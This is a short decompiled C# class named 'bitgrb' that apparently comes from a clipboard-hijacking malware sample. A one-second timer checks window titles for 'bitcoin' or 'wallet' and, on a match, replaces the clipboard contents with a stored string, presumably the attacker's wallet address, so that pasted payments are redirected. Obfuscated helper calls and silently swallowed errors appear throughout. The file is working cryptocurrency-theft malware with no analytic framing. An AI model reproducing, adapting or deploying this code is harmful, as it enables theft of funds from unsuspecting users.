using System;
using System.Diagnostics;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public class bitgrb
{
	private static System.Timers.Timer timer_0;

	public bitgrb()
	{
		Class13.F2pn6WrzFkP6h();
		base._002Ector();
	}

	public static void scanIt()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (!(process.MainWindowTitle.ToLower().Contains("BITCOIN".ToLower()) | process.MainWindowTitle.ToLower().Contains("WALLET".ToLower())))
			{
				continue;
			}
			try
			{
				Thread thread = new Thread(delegate(object a0)
				{
					Clipboard.SetText(Conversions.ToString(a0));
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(Class6.string_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Start()
	{
		timer_0 = new System.Timers.Timer(1000.0);
		timer_0.Elapsed += delegate
		{
			scanIt();
		};
		timer_0.Enabled = true;
	}

	public static void stopme()
	{
		timer_0.Elapsed += delegate
		{
			scanIt();
		};
		timer_0.Stop();
	}
}
